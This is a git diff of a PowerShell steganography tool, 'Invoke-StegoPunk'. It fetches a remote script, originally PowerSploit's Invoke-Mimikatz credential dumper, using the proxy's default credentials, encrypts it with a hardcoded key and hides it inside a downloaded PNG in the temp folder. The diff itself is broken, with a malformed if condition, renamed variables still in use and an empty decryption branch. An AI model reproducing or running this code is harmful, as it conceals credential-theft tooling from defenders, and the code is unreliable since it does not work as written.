@@ -1,13 +1,26 @@
 Invoke-StegoPunk {
                   
-          $url = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
+      Param (
+             [Parameter(Mandatory=$True,Position=1)]
+
+            [string]$Mode = "$null",
+             [Parameter(Mandatory=$True)]
+            [string]$Fileurl = "$null",
+             [Parameter(Mandatory=$True)]
+            [string]$ImageUrl = "$null",
+            [Parameter(Mandatory=$True)]
+            [string]$ImagepathName = "$null"
+            )
+      if ($Mode -like "enc*" and )
+          {
+          write-host "Encryption Mode" 
           $request = New-Object System.Net.WebCLient
           $proxy = New-Object System.Net.webproxy
           $request.proxy = $proxy
           $request.usedefaultcredentials = "true";
-          $inputstring = $request.DownloadString($url)
-          $percorso = "$ENV:temp\qwerty.png"
-          $request.Downloadfile('http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png',$percorso)
+          $inputstring = $request.DownloadString($fileurl)
+          $Imagepath = "$ENV:temp\qwerty.png"
+          $request.Downloadfile("$ImageUrl",$Imagepathname)
           $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
           $AES = New-Object System.Security.Cryptography.AesManaged
           $Passphrase="Passo"
@@ -61,5 +74,19 @@ Invoke-StegoPunk {
 
           $mio = "wootwoot" + $mio + "weetweet" + $mio2
 
-            Add-Content "$percorso" $mio
+          Add-Content "$percorso" $mio
+          } 
+        else
+          {
+           if ($Mode -like "dec*")
+               {
+                write-host "Decryption Mode" 
+               }
+              else
+               {
+                write-host "hdhdhdhdhhdhahahahahahah"
+               }
+               
+          }
+         
 }
